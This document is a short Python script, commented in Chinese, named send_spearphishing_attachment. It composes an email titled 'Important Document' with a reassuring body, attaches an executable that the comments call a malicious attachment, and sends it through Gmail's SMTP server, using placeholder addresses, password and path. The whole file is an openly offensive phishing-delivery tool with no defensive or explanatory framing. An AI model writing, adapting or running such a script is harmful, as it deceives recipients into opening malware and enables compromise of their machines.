import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def send_spearphishing_attachment():
    from_email = "sender@example.com"
    to_email = "recipient@example.com"
    subject = "Important Document"
    body = "Please find the attached document."

    msg = MIMEMultipart()
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    filename = "malicious_file.exe"  # 惡意附件的檔案名稱
    attachment = open("path/to/malicious_file.exe", "rb")  # 惡意附件的檔案路徑
    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(from_email, "password")
    text = msg.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

send_spearphishing_attachment()